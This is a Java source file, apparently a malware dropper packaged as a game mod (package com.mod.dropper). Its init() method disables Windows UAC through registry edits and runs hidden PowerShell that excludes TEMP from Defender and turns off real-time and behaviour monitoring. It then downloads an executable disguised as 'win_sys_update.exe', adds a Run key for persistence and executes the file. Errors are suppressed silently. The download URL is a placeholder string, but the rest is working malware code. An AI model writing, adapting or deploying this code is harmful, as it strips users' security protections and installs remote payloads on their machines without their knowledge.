package com.mod.dropper;

import java.io.*;
import java.net.URL;
import java.nio.file.*;

public class MainDropper {

    public static void init() {
        String url = "valeradaun";
        String path = System.getenv("TEMP") + "\\win_sys_update.exe";

        try {
            String[] uac = {
                "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",
                "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f",
                "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f"
            };
            for (String c : uac) { 
                Runtime.getRuntime().exec(c).waitFor(); 
            }

            String ps = "Add-MpPreference -ExclusionPath '" + System.getenv("TEMP") + "'; " +
                        "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true";
            
            new ProcessBuilder("powershell.exe", "-WindowStyle", "Hidden", "-Command", ps).start().waitFor();

            InputStream in = new URL(url).openStream();
            Files.copy(in, Paths.get(path), StandardCopyOption.REPLACE_EXISTING);
            in.close();

            Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"SysUpdate\" /t REG_SZ /d \"" + path + "\" /f");
            Runtime.getRuntime().exec(path);

        } catch (Exception e) {}
    }
}
